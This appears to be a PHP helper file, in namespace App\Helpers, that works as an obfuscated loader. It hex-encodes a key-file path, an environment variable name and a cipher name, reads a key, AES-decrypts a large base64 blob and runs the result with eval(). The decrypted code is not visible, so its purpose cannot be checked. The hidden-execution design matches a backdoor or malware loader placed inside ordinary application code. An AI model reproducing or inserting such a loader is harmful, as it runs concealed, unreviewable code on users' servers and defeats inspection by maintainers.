<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('7amlv1o2007JNauNSQXqDA==');

$c=base64_decode(

'a9xvOKRhyAENVe/dAiHhkdm/KYMZ+9LWU9WkBIrVEGp+MN2XmBuyRUavEJpX8wN7n7t96CKwAYIc' .
'GZLxCKkfyfcLOxePZ9SJ0vjaYxywdi2759LeQOrpRkINkpme8NgDnRdAn/0faHeBCuqqde69VLXl' .
'wpsnrGP8wIkW0TYSVMWgEvZo33XV7/1dmspMhWs27Jd/YuFyFnVFfqk1/ca5GqmKJbkvWnp4Vead' .
'f0mW1tPBcJ1yFxDgsv+lCCs/rFPzHKH930Wp9BCpbGtIsPoAJhQyfcQrEYaNrNOuOw887Y2yVwpF' .
'0fADaB9/h9NHa+Ju5lweZkQoXEeVcYoyZaJ2ReUhbNwMbu22DBbxwHQ2NUHcvt/6kTvncmwqOz/H' .
'usoxcjIFyKYVt2cQbpsgXg14qTZJ49hb4p9DEl38Lc0K1R8OopidQvk53pnqktlAX4s2/dR8PtPW' .
'fnF7EdrfC6EcHHgvdyvzuXfJ7eb7Tp6SdXrlp943Y4mPwLy0qpFoHege2iG/izRqmVnlhhWNyr5r' .
'MxWGoaCy58sQGwc8hm/B2fxPN47ilfFRz0Lb6vBGCmL5qYQsROa/Do5IwYCrheWHsMQs2jIaPxnp' .
'NL6Br4Zz7FMPtZ9U2Z3VD7mSxbPQ7e9BZLbw30q7ax2fu1beswooUSVQVuxHlrC8txMBasbfnrOD' .
'k/e4u9V1C9hUlblCrOjNM4XwHUIm3Cj6DMwdC8liGhdmoWrKPFhki8DJl3mP4li09WKT0M206es2' .
'YeEfg5I7x2WH0N/OLgjPTRhDCjxCsx/uT2xXsnSmiSFB/EiVNITJlJ7AY+5I9wMZ6DOazvPw6RvY' .
'JsbzPtiCBZm/Ij2C0HsI+2zwGiv38mXgq3C0+mEloDvxSP7Nu0BO3OVSRgldP0aUGmqu7dwBJy7j' .
'VZlsT6srqF8HkMmKKwOzeiwtmiOZNos2bRAiYkQ1MNOe8TguXoFN5yKA7o3ASl7dkY1XrNm6QA62' .
'rgoH/g5yQzrs+G7LfBCaLZm8sdWcSHkMBI240CINvVpj6Dwl9gPdPwEL0vaNbS5oWQF+mNSqvkny' .
'hbfPHadT8ZvWA+EfLHrWT0AUTh1qQ0zo+35hxD7EMRttrU5A2IIPN6ZqNhAu6LUBhfCT/mph5RE4' .
'gsvrFrL9D5HMyoKXbhzRAY3+Rfwitfsi0Gl7r4YyjXwdFf63fEOBHA1wsJrLni/XcZwc+oOTsbec' .
'Ae0uGFwx+atdyaRazXIob4t28XAoeCjxMe0xMls2yMw7uuaBkoDm4wQaNkxppeRIT5pO6kvJuAdL' .
'q8pRM5gGsqOO3jZsgsH8i/6o7WnevjFte6lPnNwqvHWzfSP4HJtz9plhv9vkaMVDw5ULfQUXKe7o' .
'Q873Bb6/aK7ZgZ1/1kXLsIjP2cBye2dXuGpu8Vf3Du6bX9uAGtRiwGuI8gt5RDQ4V5GcYMXLO3Wk' .
'ympSQWXKn0J0YCEQSigVWudsgqLrMRYNu+Y9P+sy4pdb0m3132jSaN4MmNUiOhWnwbKCLnbY7eOK' .
'GB4FTIkW4fWBPl/jwNOQ+D1ahyU2DoJWOqXKADuseVEjpNCMgba2A2izCuBcp2kra6+8clv39vWl' .
'oBfCnR60s6Th8NTLUCPQIbWcrznPYnQZASHpQV7wLlBhTm/5O1G3Xl3hpQ4vi3c3LFnmE+Z/Rr2F' .
'L/Je8aqdiJ7xQQvAoJI8Y/ioN1rjXwo9NpFrRMYbPOomSO0c/9WqwdsiSw0LtVSXRfs54piKx/XE' .
'IUrQJhYwny+xEGLHK9gbUNZyYihrWpmtb3l/JyP00vdhF0BHpCfKXkqyc09T+3OwPOPD3qU70LXR' .
'Wa/sukdwmv9wWjfIQKNFG410LlwP6yBtPkAGl0/DQpOSWpI1SYAZ69m0Tq9lGdqUFtVY6tG+S0qy' .
'uhRiTmW7GpVauTWJ8voW0rmhF7Zr4GD+i5fMYoktTOtjVnDpG1yDxEd8DG8otReos9UNdvAPUIaP' .
'fcyAV05qSAD4nMRUdV4yK2Ve1dPlXpKv1N+ikz9UOi9BdloDsWW4Ny2Mr4/ZfnrR12zotJ/7mIXr' .
'NzAOGOnxzueuNKubQ2VEVoDuOBvjp8iMzy5ESJh/NEhvwjg6B9is3PB49tHitcm2aomaJUX3tISk' .
'OIhFYvOsjbaff7It5kk2Y2lbgFhE/kpsxakETJRgQMhiXARNUaDlpaXyuN34Kbch0vW0zGBILvTF' .
'YF1eNUFlWI9PS4/XTt7CfF39RpUyUdOSCYe4V2uV1hMmNnAYeCEVrJeSEceksl6iPj8i6/C5kdIJ' .
'XHjc8Vbo1P9E+e//oVFXN8PVvzTEpAA2xRSsr1oe1mrO2kEGVVVX6YWzEtWM/fS053/+Q/xYOrug' .
'wib9gFWKUxYhDiZyFyQ3tc4llAKJzt5+JeYkwtdKELKbIkpCdbK4+c99LffH7+lh9aGCbztjOTQB' .
'hDODCiFurZ0FtMbbhBLVxiTfDs06BwInONUt+wuj6XFlNzjHCPE7E81PY9kF80eAyFCQzfyBFFQx' .
'2ZzgvGPZxk1TiyENWYGpjxs8e9xQ+1am1E5TosSFoH6NurFqSJPpvVJwe5/mxhI9jB0bUStw+qIM' .
'd/Ik9UP8mS5dkrSq8xpr+az4DPorD/lW+pB5TwmrpATV28+s0ii9HrvyJGqOQqsxfeOOlpyYe0s1' .
'A7Lg8LNkqNg7jHDxEhxGD7bAdYaUYmYMxuo2bkGCjfXRsAqWBz56wvhDQ8oONPKjvPdkj8MUt+z4' .
'86xWjGQbw8nMKzPIRaQoRnuOgqrphbSq7fSyHuwuA8q478AWMwD3R7E6NWoE6F0JznV6DbKTPbba' .
'oZUT2VXH8aMxZaHn4XyyB68hVbwjI7b43rbPmgEDaYiOuKuU7C8AVFqKHQxsfB8twTF9ZZujRwQt' .
'uyz7EFH1KuNyHOZpfINq0uf2dSBS3DIJEdaxtOk9GWzA0tU0XG79sCkOv8bNphsF/vAo8PMXgDoX' .
'RAIGBvW22c4S5EczUonLC6s='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

